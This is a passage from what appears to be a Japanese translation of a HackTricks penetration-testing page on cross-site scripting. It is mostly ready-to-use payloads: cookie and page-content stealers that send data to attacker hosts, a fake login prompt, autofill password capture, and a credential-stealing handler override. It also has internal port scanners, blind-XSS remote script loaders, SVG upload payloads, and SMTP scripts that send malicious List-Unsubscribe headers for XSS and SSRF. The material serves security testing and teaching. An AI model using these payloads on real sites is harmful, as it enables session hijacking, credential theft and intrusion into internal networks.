((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟoﾟ]
)(ﾟΘﾟ)
)("_")
```

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## XSS の一般的な payloads

### 1つにまとめた複数の payloads


{{#ref}}
steal-info-js.md
{{#endref}}

### Iframe Trap

ユーザーをページ内に留め、iframe を抜けずに操作（フォームに送信された情報を含む）を盗む:


{{#ref}}
../iframe-traps.md
{{#endref}}

### Cookies を取得
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
> [!TIP]
> cookie に HTTPOnly フラグが設定されている場合、**JavaScript から cookies にアクセスすることはできません。** しかし、運が良ければここに [some ways to bypass this protection](../hacking-with-cookies/index.html#httponly) があります。

### ページのコンテンツを盗む
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8"
var attacker = "http://10.10.14.8/exfil"
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open("GET", url, true)
xhr.send(null)
```
### 内部IPを見つける
```html
<script>
var q = []
var collaboratorURL =
"http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net"
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for (i = 1; i <= 255; i++) {
q.push(
(function (url) {
return function () {
fetchUrl(url, wait)
}
})("http://192.168.0." + i + ":8080")
)
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for (i = 1; i <= n_threads; i++) {
if (q.length) q.shift()()
}

function fetchUrl(url, wait) {
console.log(url)
var controller = new AbortController(),
signal = controller.signal
fetch(url, { signal })
.then((r) =>
r.text().then((text) => {
location =
collaboratorURL +
"?ip=" +
url.replace(/^http:\/\//, "") +
"&code=" +
encodeURIComponent(text) +
"&" +
Date.now()
})
)
.catch((e) => {
if (!String(e).includes("The user aborted a request") && q.length) {
q.shift()()
}
})

setTimeout((x) => {
controller.abort()
if (q.length) {
q.shift()()
}
}, wait)
}
</script>
```
### Port Scanner (fetch)
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### Port Scanner (websockets)
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_短い時間はポートが応答していることを示す_ _長い時間は応答がないことを示す_

Chromeでブロックされているポートの一覧は[**here**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net_util.cc)、Firefoxの一覧は[**here**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist)を参照してください。

### 認証情報を要求するボックス
```html
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### Auto-fillによるパスワードの取得
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
password フィールドに任意のデータが入力されると、username と password が attackers server に送信されます。クライアントが保存された password を選択して何も入力しない場合でも、credentials は ex-filtrated されます。

### フォームハンドラを乗っ取って credentials を exfiltrate する (const shadowing)

もし重要なハンドラ（例: `function DoLogin(){...}`）がページの後で宣言され、あなたの payload がより早く実行される場合（例: inline JS-in-JS sink を介して）、同名の `const` を先に定義してハンドラを先取り・ロックします。後続の function 宣言は `const` 名を再バインドできないため、あなたのフックが制御を保持します:
```javascript
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value);
const user = Trim(FormInput.InputUtente.value);
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));
};
```
Notes
- これは実行順序に依存します: あなたのインジェクションは正規の宣言より先に実行されなければなりません。
- If your payload is wrapped in `eval(...)`, `const/let` bindings won’t become globals. Use the dynamic `<script>` injection technique from the section “Deliverable payloads with eval(atob()) and scope nuances” to ensure a true global, non-rebindable binding.
- キーワードフィルタがコードをブロックする場合は、Unicode-escaped identifiers や `eval(atob('...'))` 配信と組み合わせてください（上で示したとおり）。

### Keylogger

Just searching in github I found a few different ones:

- [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
- [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
- [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
- You can also use metasploit `http_javascript_keylogger`

### CSRF tokensを盗む
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### PostMessage メッセージの窃取
```html
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### Service Workers の悪用


{{#ref}}
abusing-service-workers.md
{{#endref}}

### Shadow DOM へのアクセス


{{#ref}}
shadow-dom.md
{{#endref}}

### Polyglots


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt
{{#endref}}

### Blind XSS payloads

また、次を使用できます: [https://xsshunter.com/](https://xsshunter.com)
```html
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>

<!-- Payloads from https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide -->
<!-- Image tag -->
'"><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- Input tag with autofocus -->
'"><input autofocus onfocus="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- In case jQuery is loaded, we can make use of the getScript method -->
'"><script>$.getScript("{SERVER}/script.js")</script>

<!-- Make use of the JavaScript protocol (applicable in cases where your input lands into the "href" attribute or a specific DOM sink) -->
javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw=="))

<!-- Render an iframe to validate your injection point and receive a callback -->
'"><iframe src="{SERVER}"></iframe>

<!-- Bypass certain Content Security Policy (CSP) restrictions with a base tag -->
<base href="{SERVER}" />

<!-- Make use of the meta-tag to initiate a redirect -->
<meta http-equiv="refresh" content="0; url={SERVER}" />

<!-- In case your target makes use of AngularJS -->
{{constructor.constructor("import('{SERVER}/script.js')")()}}
```
### Regex - 非表示のコンテンツにアクセス

From [**this writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay) からわかるように、いくつかの値がJSから消えても、異なるオブジェクトのJS属性内で依然としてそれらを見つけられることがあります。例えば、REGEXのinputは、REGEXの入力値が削除された後でも見つかることがあります：
```javascript
// Do regex with flag
flag = "CTF{FLAG}"
re = /./g
re.test(flag)

// Remove flag value, nobody will be able to get it, right?
flag = ""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(
document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"]
)
```
### Brute-Force List


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt
{{#endref}}

## XSS を用いた他の脆弱性の悪用

### Markdown 内の XSS

レンダリングされる Markdown コードを注入できますか？ もしかすると XSS が発生するかもしれません。確認：


{{#ref}}
xss-in-markdown.md
{{#endref}}

### XSS から SSRF へ

**キャッシュを使用するサイト**で XSS を見つけましたか？ Edge Side Include Injection を通じて、**それを SSRF に昇格**させてみてください。payload:
```python
<esi:include src="http://yoursite.com/capture" />
```
Use it to bypass cookie restrictions, XSS filters and much more!\
この手法の詳細は次を参照: [**XSLT**](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md).

### XSS in dynamic created PDF

ウェブページがユーザー制御の入力から PDF を生成している場合、PDF を生成する **bot を騙して** **任意の JS コードを実行させる**ことを試せます。\
つまり、**PDF creator bot が**何らかの **HTML タグ** を見つけると、それらを **解釈** し、この挙動を **悪用** して **Server XSS** を引き起こすことができます。

{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}

HTML タグを注入できない場合は、**PDF データを注入する**ことを試す価値があります：

{{#ref}}
pdf-injection.md
{{#endref}}

### XSS in Amp4Email

AMP はモバイル端末でのウェブページの表示高速化を目的としており、機能を担保するために JavaScript を補った HTML タグを取り入れ、速度とセキュリティに重点を置いています。さまざまな機能向けのコンポーネント群をサポートしており、[AMP components](https://amp.dev/documentation/components/?format=websites) から参照できます。

[**AMP for Email**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/) フォーマットは特定の AMP コンポーネントをメールに拡張し、受信者がメール内で直接コンテンツと相互作用できるようにします。

例: [**writeup XSS in Amp4Email in Gmail**](https://adico.me/post/xss-in-gmail-s-amp4email).

### List-Unsubscribe Header Abuse (Webmail XSS & SSRF)

RFC 2369 の `List-Unsubscribe` ヘッダは攻撃者制御の URI を埋め込み、多くの webmail やメールクライアントがそれを自動的に「Unsubscribe」ボタンに変換します。これらの URI が検証なしにレンダリングまたは取得されると、ヘッダはストアド XSS（unsubscribe リンクが DOM に配置される場合）や SSRF（サーバがユーザに代わって unsubscribe リクエストを実行する場合）の注入ポイントになります。

#### Stored XSS via `javascript:` URIs

1. **自分宛にメールを送る** — ヘッダが `javascript:` URI を指すようにし、メッセージの残りはスパムフィルタに弾かれないよう無害にしておく。  
2. **UI がその値をレンダリングすることを確認する**（多くのクライアントはそれを「List Info」ペインに表示する）および生成される `<a>` タグが `href` や `target` のような攻撃者制御の属性を継承しているかを確認する。  
3. **実行を誘発する**（例: CTRL+click、ミドルクリック、または「open in new tab」）リンクが `target="_blank"` を使っている場合、ブラウザは提供された JavaScript を webmail アプリケーションのオリジンで評価します。  
4. ストアド XSS のプリミティブが成立することを確認する: ペイロードはメールとともに永続化され、実行にはクリックが必要なだけです。
```text
List-Unsubscribe: <javascript://attacker.tld/%0aconfirm(document.domain)>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
URI内の改行バイト（`%0a`）は、Horde IMP H5 のような脆弱なクライアントでも、レンダリングパイプラインを通過してしまい、アンカータグ内にその文字列をそのまま出力することを示しています。

<details>
<summary>悪意のある List-Unsubscribe ヘッダーを配信する最小限の SMTP PoC</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
sender = "list@example.org"
recipient = "victim@example.org"

msg = EmailMessage()
msg.set_content("Testing List-Unsubscribe rendering")
msg["From"] = sender
msg["To"] = recipient
msg["Subject"] = "Newsletter"
msg["List-Unsubscribe"] = "<javascript://evil.tld/%0aconfirm(document.domain)>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

#### サーバー側の配信停止プロキシ -> SSRF

Nextcloud Mail app のようなクライアントの中には、配信停止アクションをサーバー側でプロキシするものがある：ボタンをクリックするとサーバー自身が指定された URL を取得するよう指示される。これによりヘッダが SSRF のプリミティブになる。特に管理者が `'allow_local_remote_servers' => true` を設定している場合（[HackerOne report 2902856](https://hackerone.com/reports/2902856) に記録されている）、loopback および RFC1918 範囲へのリクエストが許可される。

1. **メールを作成する** where `List-Unsubscribe` が攻撃者管理のエンドポイントを指すようにする（ブラインド SSRF の場合は Burp Collaborator / OAST を使用）。
2. **`List-Unsubscribe-Post: List-Unsubscribe=One-Click` を維持する** — UI にワンクリックで配信停止できるボタンを表示させるため。
3. **信頼要件を満たす**: 例えば Nextcloud はメッセージが DKIM を通過した場合にのみ HTTPS の配信停止リクエストを実行するため、攻撃者は自分でコントロールするドメインでメールに署名する必要がある。
4. **対象サーバーで処理されるメールボックスにメッセージを配信する** — ユーザーが配信停止ボタンをクリックするまで待つ。
5. **collaborator エンドポイントでサーバー側のコールバックを観察する** — プリミティブが確認されたら内部アドレスへ pivot する。
```text
List-Unsubscribe: <http://abcdef.oastify.com>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
<details>
<summary>SSRFテスト用のDKIM署名済み List-Unsubscribe メッセージ</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage
import dkim

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
dkim_selector = "default"
dkim_domain = "example.org"
dkim_private_key = """-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----"""

msg = EmailMessage()
msg.set_content("One-click unsubscribe test")
msg["From"] = "list@example.org"
msg["To"] = "victim@example.org"
msg["Subject"] = "Mailing list"
msg["List-Unsubscribe"] = "<http://abcdef.oastify.com>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

raw = msg.as_bytes()
signature = dkim.sign(
message=raw,
selector=dkim_selector.encode(),
domain=dkim_domain.encode(),
privkey=dkim_private_key.encode(),
include_headers=["From", "To", "Subject"]
)
msg["DKIM-Signature"] = signature.decode().split(": ", 1)[1].replace("\r", "").replace("\n", "")

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

**テストノート**

- ブラインド SSRF ヒットを収集するために OAST エンドポイントを使用し、プリミティブが確認されたら `List-Unsubscribe` URL を `http://127.0.0.1:PORT`、メタデータサービス、またはその他の内部ホストをターゲットにするよう適応させてください。
- unsubscribe helper はしばしばアプリケーションと同じ HTTP スタックを再利用するため、その proxy settings、HTTP verbs、および header rewrites を継承します。これにより、[SSRF methodology](../ssrf-server-side-request-forgery/README.md) で説明されている追加の traversal tricks を利用できます。

### XSS ファイルのアップロード (svg)

次のようなファイルを画像としてアップロードします（出典: [http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)）:
```html
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```html
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```html
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x" /></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
より多くの **SVG payloads** は [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet) で見つかります

## その他の JS トリック & 関連情報


{{#ref}}
other-js-tricks.md
{{#endref}}

## XSS リソース

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
- [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
- [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
- [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
- [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)
- [https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide)

## 参考資料

- [Turning a harmless XSS behind a WAF into a realistic phishing vector](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/)
- [XSS and SSRF via the List-Unsubscribe SMTP Header in Horde Webmail and Nextcloud Mail](https://security.lauritz-holtmann.de/post/xss-ssrf-list-unsubscribe/)
- [HackerOne Report #2902856 - Nextcloud Mail List-Unsubscribe SSRF](https://hackerone.com/reports/2902856)
- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [MDN eval()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)

{{#include ../../banners/hacktricks-training.md}}
